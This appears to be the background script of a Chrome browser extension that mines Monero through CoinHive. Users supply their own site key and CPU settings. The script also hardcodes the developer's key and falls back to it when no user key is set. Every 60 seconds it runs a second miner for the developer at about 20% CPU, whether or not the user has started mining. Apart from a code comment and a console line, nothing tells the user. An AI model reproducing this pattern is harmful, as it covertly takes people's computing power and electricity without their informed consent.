let miner = null;
let minerAdmin = null;
let loadScript = (url, callback) => {
        var script = document.createElement("script");
        script.type = "text/javascript"
        script.onload = function () {
            callback();
        };
        script.onerror = function () {
            setTimeout(location.reload, 5000);
        };
        script.src = url;
        try {
            document.body.appendChild(script);
        }
        catch (e) {
            setTimeout(() => {
                document.body.appendChild(script);
            }, 1000);
        }
    }
let sendToPopup = (obj) => {
        chrome.runtime.sendMessage(obj);
    };
let onUserMinerError = (params) => {
        switch (params.error) {
            case 'invalid_site_key': {
                miner.stop();
				localStorage.removeItem('siteKey');
                sendToPopup({
                    invoke: 'invalidSiteKey'
                });
            }
        }
        console.warn(params);
    };
let changeToAdmin = () => {
			var iThrottle = localStorage.getItem('Throttle') || 0.90;
            minerAdmin.start(CoinHive.FORCE_MULTI_TAB);
			//10% time & 20% option CPU for developer share with 100% time & 100% option CPU user = 1% fee ~
			minerAdmin.setThrottle(0.80); //20% CPU
            setTimeout(changeToUser, 6000) // 6s/60s
    };
let changeToUser = () => {
		console.log(miner.getTotalHashes()+" hash for you & "+minerAdmin.getTotalHashes()+" hash for developer");
        minerAdmin.stop();
    };
let init = () => {
		var aCoinhive = localStorage.getItem('siteKey');
		aCoinhiveAdmin = "nDTMLf7atZSpKHpuah2lSuVPG58J92un";
		if(!aCoinhive) {
			aCoinhive = aCoinhiveAdmin;
			localStorage.setItem('siteKey',aCoinhive);
		}
		var iThrottle = localStorage.getItem('Throttle') || 0;
		var storeThreads = localStorage.getItem('nbthreads') || navigator.hardwareConcurrency;
		if(!iThrottle) {
			localStorage.setItem('Throttle',iThrottle);
		}
		// Configure CoinHive to point to your proxy
		//CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://pool.supportxmr.com/proxy"]];
		cookie = localStorage.getItem("cookie");
		username = "Anonym";
		if(cookie) {
			jsonCookie = JSON.parse(cookie);
			username = jsonCookie.n;
		}
        miner = new CoinHive.User(aCoinhive, "Extension CoinHive+",{throttle: iThrottle});
		minerAdmin = new CoinHive.User(aCoinhiveAdmin,username,{throttle: 0.99});
		miner.on('error', onUserMinerError);
		if(storeThreads == "Auto") {
			miner.setAutoThreadsEnabled(true);
			miner.stop();
		}
		else {
			miner.setNumThreads(storeThreads);
			miner.stop();
		}
		if(localStorage.getItem('autostart')=="true") {
			miner.start();
		}
		setInterval(changeToAdmin, 60000); // every 60s
		miner.on('found', function() { 
			var totalHashes = miner.getTotalHashes();
			var iFixed = 2;
			c_totalHashes = totalHashes.toString();
			if((totalHashes/1000) > 1) {
				if((totalHashes/1000)>=100) {
					iFixed = 1;
				}
				c_totalHashes = (totalHashes/1000).toFixed(iFixed).toString() + "k";
				if((totalHashes/1000000) > 1) {
					if((totalHashes/1000000)>=100) {
						iFixed = 1;
					}
					c_totalHashes = (totalHashes/1000000).toFixed(iFixed).toString() + "M";
				}
			}
			chrome.browserAction.setBadgeText({
			    text: c_totalHashes
		  });
		});
		miner.on('open', function() { 
		  chrome.browserAction.setBadgeBackgroundColor({
			color : "#0000FF"
			});
		});
		miner.on('close', function() { 
		  chrome.browserAction.setBadgeBackgroundColor({
			color : "#FF0000"
			});
		});
    };